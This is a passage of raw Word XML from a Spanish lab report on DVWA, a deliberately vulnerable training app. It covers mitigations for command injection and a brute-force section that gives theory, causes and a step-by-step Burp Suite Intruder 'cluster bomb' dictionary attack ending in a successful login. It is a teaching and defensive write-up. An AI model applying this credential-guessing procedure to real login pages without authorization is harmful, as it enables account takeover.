      <w:r w:rsidR="004F4753">
        <w:t>.8</w:t>
      </w:r>
      <w:r>
        <w:t>. Propuesta de mitigación</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA3400E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Evitar completamente shell_exec(), exec(), system(), passthru() — usar funciones nativas del lenguaje.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DD407E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Si es indispensable: validar con regex de IP estricta antes de llamar al SO:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFFC85C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>if (preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $target)) {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B6602A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>escapeshellarg(): envuelve el argumento en comillas simples y escapa comillas internas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379416EE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Principio de mínimo privilegio: el proceso web no debe tener acceso de escritura al SO.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728A1FD4" w14:textId="77777777" w:rsidR="00E64671" w:rsidRDefault="009E1026" w:rsidP="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>WAF: bloquear patrones de metacaracteres de shell en parámetros HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009A6D5A" w14:textId="37F3F81C" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76" w:rsidP="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F61C0EE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilidad 7 — Brute Force (Fuerza Bruta sobre Autenticación)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24333CE3" w14:textId="6DB4F0FE" w:rsidR="00AE5F76" w:rsidRDefault="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.1 </w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>Teoría</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB387E9" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Un ataque de fuerza bruta sobre autenticación prueba sistemáticamente combinaciones de credenciales hasta encontrar las válidas. Existen dos variantes principales:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2876"/>
        <w:gridCol w:w="2878"/>
        <w:gridCol w:w="2876"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="76EB53BF" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="6E71DF5E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Variante</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="2192FE4E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Descripción</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="1F32B235" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Herramienta típica</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="4A5B99FB" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3CF8C4F1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Fuerza bruta pura</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2EA82373" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Prueba todas las combinaciones posibles de caracteres hasta alcanzar la longitud máxima.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0364BAB6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>hashcat, john</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="21DCF4A4" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="372EFF10" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ataque de diccionario</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="20FBCA3A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Prueba contraseñas de una lista precompilada de palabras reales, comunes o filtradas de brechas previas.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7689DC7F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Hydra, Medusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="28367868" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34A1FED6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Credential stuffing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="45BA279E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Usa pares usuario/contraseña reales obtenidos de brechas anteriores y los prueba en otros servicios.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="118EA401" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Snipr, Burp Suite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4CB5F08B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="7AD9D843" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>El ataque de diccionario es el más común en la práctica: la wordlist rockyou.txt contiene ~14 millones de contraseñas reales filtradas de la brecha de RockYou (2009). La mayoría de usuarios reutilizan contraseñas débiles o predecibles, lo que hace que este ataque sea efectivo en segundos contra sistemas sin mecanismos de protección.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124A8564" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="4FEC1B54" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Problemas de seguridad del mecanismo de autenticación de DVWA nivel Low:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE142BA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Formulario usa método GET — credenciales viajan en la URL, visibles en logs del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC9B1E8" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Sin límite de intentos fallidos (account lockout).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BB1768" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Sin CAPTCHA ni challenge-response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7DA9A7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Sin rate limiting (no hay restricción de velocidad de peticiones).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E24057" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Contraseñas hasheadas con MD5 sin salt — algoritmo roto, vulnerable a tablas arcoíris.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCB06D2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="73D18F7C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sobre MD5 como hash de contraseñas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497A8926" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>MD5 fue diseñado para verificación de integridad de archivos, no para almacenamiento de contraseñas. Sus problemas para este uso son: (1) velocidad — una GPU moderna calcula miles de millones de hashes MD5 por segundo; (2) sin salt — dos usuarios con la misma contraseña tienen el mismo hash, permitiendo ataques de tablas arcoíris precomputadas; (3) colisiones conocidas — dos entradas distintas pueden producir el mismo hash. La alternativa correcta es bcrypt, argon2id o scrypt, algoritmos diseñados específicamente para ser lentos y con salt automático.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629E1152" w14:textId="4FC8AC15" w:rsidR="00AE5F76" w:rsidRDefault="00E64671">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>2. Causas de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650B7351" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a. Ausencia de validaciones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B63BA9" w14:textId="607E7FF6" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>El servidor no lleva conteo de intentos fallidos por usuario ni por IP. No existe mecanismo de penalización (tiempo de espera o bloqueo) ante credenciales incorrectas repetidas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1BA4A1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>b. Errores de lógica</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADF5008" w14:textId="6FFFF481" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>El formulario usa método GET, exponiendo las credenciales en la URL. Las peticiones GET son trivialmente automatizables: Hydra puede repetirlas modificando solo los parámetros de la cadena de consulta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440E3BEA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c. Manejo inadecuado de credenciales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711D6742" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Las contraseñas están almacenadas con hash MD5 sin salt. Además, la respuesta del servidor ante login fallido ("Username and/or password incorrect.") permite enumerar la existencia de usuarios cuando el mensaje varía entre usuario inexistente y contraseña incorrecta (en configuraciones más verbosas).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100F345C" w14:textId="22954302" w:rsidR="00AE5F76" w:rsidRDefault="00E64671">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>3. Mecanismo de ataque — Ataque de diccionario con Hydra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1B012D" w14:textId="3D614038" w:rsidR="00121928" w:rsidRPr="00121928" w:rsidRDefault="00121928" w:rsidP="00121928">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 y 7.5. Mecanismo de ataque — Ataque de diccionario con Hydra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022B7902" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="58CDF8CC" w14:textId="598E4BBC" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="00121928">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Paso 1 —</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Analizar la petición de login</w:t>
      </w:r>
      <w:r w:rsidR="00121928">
        <w:t xml:space="preserve"> desde </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp Suite</w:t>
      </w:r>
      <w:r w:rsidR="00121928">
        <w:t xml:space="preserve"> imagen 7.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C0B5AC" w14:textId="77777777" w:rsidR="00121928" w:rsidRDefault="00121928">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="364083D6" wp14:editId="223CF1CF">
            <wp:extent cx="5427424" cy="2606294"/>
            <wp:effectExtent l="0" t="0" r="1905"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8472" cy="2611600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1858030A" w14:textId="5DC514E1" w:rsidR="00121928" w:rsidRDefault="00121928">
      <w:r w:rsidRPr="00121928">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Imagen7.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Petición capturada desde burpsuite.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B78A310" w14:textId="66D44230" w:rsidR="00121928" w:rsidRDefault="00121928">
      <w:r>
        <w:t>Con esta petición identificada, la enviamos a “intruder” de burp site. Como vamos a forzar tanto el Usuario como la contraseña ( 2 parametros) crearemos un ataque tipo “Cluster Bomb” imagen2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F572966" w14:textId="7DDC0F15" w:rsidR="00121928" w:rsidRDefault="00121928"/>
    <w:p w14:paraId="7E3BA185" w14:textId="29EB8BE3" w:rsidR="00121928" w:rsidRDefault="00121928">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74E2A68C" wp14:editId="647CF210">
            <wp:extent cx="5447899" cy="2250440"/>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4334" cy="2253098"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D101704" w14:textId="53535F83" w:rsidR="00121928" w:rsidRDefault="00121928" w:rsidP="00121928">
      <w:r w:rsidRPr="00121928">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Imagen7.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:r w:rsidRPr="00121928">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Configuración payload cluster bomb</w:t>
      </w:r>
      <w:r w:rsidRPr="00121928">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C625D14" w14:textId="79C762FF" w:rsidR="00121928" w:rsidRDefault="00121928">
      <w:r>
        <w:t xml:space="preserve">Finalmente para el cluster bomb utilizaremos 2 diccionarios </w:t>
      </w:r>
      <w:r w:rsidR="00852965">
        <w:t>de la carpeta Metasploit. Los diccionarios utilizados son</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712DD63B" w14:textId="0BA15A32" w:rsidR="00852965" w:rsidRDefault="00852965" w:rsidP="00852965">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>User: http_defult_user.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB891E8" w14:textId="5F9B2C36" w:rsidR="00852965" w:rsidRDefault="00852965" w:rsidP="00852965">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Password: http_defult_password.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58006781" w14:textId="493166EC" w:rsidR="00852965" w:rsidRDefault="00852965" w:rsidP="00852965">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Y de acuerdo a la configuración mostrada en la imagen 7.3 generamos el ataque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07465A1C" w14:textId="30FB86A4" w:rsidR="00852965" w:rsidRDefault="00852965" w:rsidP="00852965">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C690A56" w14:textId="3D67C3EF" w:rsidR="00852965" w:rsidRDefault="00852965" w:rsidP="00852965">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50D4840F" wp14:editId="71D7D6F0">
            <wp:extent cx="5486400" cy="26346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634615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6175D8D4" w14:textId="16C8D95A" w:rsidR="00121928" w:rsidRDefault="00F8005C">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="00121928" w:rsidRPr="00F8005C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>magen 7.</w:t>
      </w:r>
      <w:r w:rsidRPr="00F8005C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00121928">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">payloads del cluster bomb </w:t>
      </w:r>
      <w:r w:rsidR="00121928">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3246FE47" w14:textId="4DA45D16" w:rsidR="00F8005C" w:rsidRDefault="00F8005C">
      <w:r>
        <w:t xml:space="preserve">Finalmente, al ejecutar cluster bomb, obtenemos multiples combinacion de los  2 payloads, donde la mayoria son combinaciones erradas, pero al analizar la longitude de las </w:t>
      </w:r>
      <w:r w:rsidR="00AD120E">
        <w:t>respuestas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que menos se repiten, encontramos </w:t>
      </w:r>
      <w:r w:rsidR="00AD120E">
        <w:t>combinaciones que son probables  (imagen4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4DCB91" w14:textId="2C2FA45A" w:rsidR="00AD120E" w:rsidRDefault="00AD120E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="311AEB25" wp14:editId="307DC41E">
            <wp:extent cx="5177375" cy="2486219"/>
            <wp:effectExtent l="0" t="0" r="444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87246" cy="2490959"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC0D6FB" w14:textId="3852EC23" w:rsidR="00AD120E" w:rsidRDefault="00AD120E">
      <w:r w:rsidRPr="00AD120E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Imagen7.4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> respuesta al cluster bomb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6039DDFF" w14:textId="42B1A57E" w:rsidR="00AD120E" w:rsidRDefault="00AD120E">
      <w:r>
        <w:t xml:space="preserve">Adicional, se pueden utilizar otros diccionarios famosos como rockYou o unix, el cual tiene mas palabras, sin embargo. Se demora mas en ejecutar todas las combinaciones. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3426ABA4" w14:textId="28BF6E89" w:rsidR="00AD120E" w:rsidRDefault="00AD120E">
      <w:r>
        <w:t>Y para terminar ingresamos a DVWA con los datos obtenidos imagen 7.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5300537D" w14:textId="20AAF281" w:rsidR="00AD120E" w:rsidRDefault="00AD120E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="322F10AF" wp14:editId="47DF2AA5">
            <wp:extent cx="4059752" cy="194952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78632" cy="1958593"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE3BDEA" w14:textId="3BD143F5" w:rsidR="00AD120E" w:rsidRDefault="00AD120E">
      <w:r w:rsidRPr="00AD120E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Imagen 7.5</w:t>
      </w:r>
      <w:r>
        <w:t>: Página vulnerada con fuerza bruta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC57D65" w14:textId="46540B11" w:rsidR="00AE5F76" w:rsidRDefault="00E64671">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00AD120E">
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Clasificación técnica</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4315"/>
        <w:gridCol w:w="4315"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="75B6ACB5" w14:textId="77777777" w:rsidTr="00CC453F">
        <w:trPr>
          <w:trHeight w:val="205"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="5F68550B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Referencia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
